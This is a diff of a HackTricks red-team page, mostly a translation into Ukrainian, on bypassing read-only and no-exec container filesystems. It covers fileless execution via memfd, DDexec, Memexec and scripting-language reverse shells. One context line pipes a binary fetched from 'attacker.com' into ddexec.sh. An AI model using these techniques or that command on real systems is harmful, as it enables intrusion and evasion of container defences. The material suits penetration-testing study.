@@ -15,9 +15,9 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 </details>
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
+If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -30,7 +30,7 @@ In the following videos you can find the techniques mentioned in this page expla
 
 ## read-only / no-exec scenario
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Все частіше можна зустріти linux-машини, змонтовані з **захистом файлової системи тільки для читання (ro)**, особливо в контейнерах. Це пов'язано з тим, що запустити контейнер з файловою системою ro так само просто, як встановити **`readOnlyRootFilesystem: true`** в `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -45,42 +45,42 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Однак, навіть якщо файлова система змонтована як ro, **`/dev/shm`** все ще буде доступна для запису, тому це неправда, що ми не можемо нічого записати на диск. Проте, ця папка буде **змонтована з захистом no-exec**, тому якщо ви завантажите бінарний файл сюди, ви **не зможете його виконати**.
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+З точки зору червоної команди, це ускладнює **завантаження та виконання** бінарних файлів, які вже не знаходяться в системі (як бекдори або енумератори, такі як `kubectl`).
 {% endhint %}
 
 ## Easiest bypass: Scripts
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Зверніть увагу, що я згадував бінарні файли, ви можете **виконувати будь-який скрипт**, якщо інтерпретатор знаходиться всередині машини, наприклад, **shell-скрипт**, якщо `sh` присутній, або **python** **скрипт**, якщо встановлений `python`.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Однак цього недостатньо, щоб виконати ваш бінарний бекдор або інші бінарні інструменти, які вам можуть знадобитися.
 
 ## Memory Bypasses
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Якщо ви хочете виконати бінарний файл, але файлова система цього не дозволяє, найкращий спосіб зробити це - **виконати його з пам'яті**, оскільки **захисти не застосовуються там**.
 
 ### FD + exec syscall bypass
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+Якщо у вас є потужні скриптові движки всередині машини, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити бінарний файл для виконання з пам'яті, зберегти його в файловому дескрипторі пам'яті (`create_memfd` syscall), який не буде захищений цими захистами, а потім викликати **`exec` syscall**, вказуючи **fd як файл для виконання**.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Для цього ви можете легко використовувати проект [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви можете передати йому бінарний файл, і він згенерує скрипт у вказаній мові з **бінарним файлом, стиснутим і закодованим в b64** з інструкціями для **декодування та розпакування** його в **fd**, створеному за допомогою виклику `create_memfd` syscall, і викликом **exec** syscall для його виконання.
 
 {% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+Це не працює в інших скриптових мовах, таких як PHP або Node, оскільки у них немає жодного **за замовчуванням способу викликати сирі системні виклики** з скрипту, тому неможливо викликати `create_memfd`, щоб створити **memory fd** для зберігання бінарного файлу.
 
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+Більше того, створення **звичайного fd** з файлом у `/dev/shm` не спрацює, оскільки вам не дозволять його виконати через те, що **захист no-exec** буде застосований.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) - це техніка, яка дозволяє вам **модифікувати пам'ять вашого власного процесу** шляхом перезапису його **`/proc/self/mem`**.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Отже, **контролюючи асемблерний код**, який виконується процесом, ви можете написати **shellcode** і "мутувати" процес, щоб **виконати будь-який довільний код**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
+**DDexec / EverythingExec** дозволить вам завантажити та **виконати** ваш власний **shellcode** або **будь-який бінарний файл** з **пам'яті**.
 {% endhint %}
 ```bash
 # Basic example
@@ -94,7 +94,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком DDexec. Це **DDexec shellcode demonised**, тому що щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec через техніку DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та виконання**.
+[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком DDexec. Це **DDexec shellcode demonised**, тому що щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec за допомогою техніки DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та виконання**.
 
 Ви можете знайти приклад того, як використовувати **memexec для виконання бінарних файлів з PHP реверс-шелу** за адресою [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
@@ -118,7 +118,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Отже, ви **не зможете** отримати **реверс-шел** або **перерахувати** систему, як зазвичай.
 {% endhint %}
 
-Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-якої **скриптової мови**.
+Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-яких **скриптових мов**.
 
 {% hint style="success" %}
 Використовуючи скриптову мову, ви могли б **перерахувати систему**, використовуючи можливості мови.
@@ -130,11 +130,11 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Однак у таких контейнерах ці захисти зазвичай існують, але ви могли б використовувати **попередні техніки виконання в пам'яті, щоб обійти їх**.
 {% endhint %}
 
-Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконувати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE** для отримання реверс-шелів скриптових мов та виконання бінарних файлів з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Якщо вас цікавить **кар'єра в хакінгу** та зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
+Якщо вас цікавить **кар'єра в хакінгу** і ви хочете зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -144,11 +144,11 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 <details>
 
-<summary>Підтримати HackTricks</summary>
+<summary>Підтримка HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
 * **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
+* **Діліться хакерськими трюками, подаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
 {% endhint %}
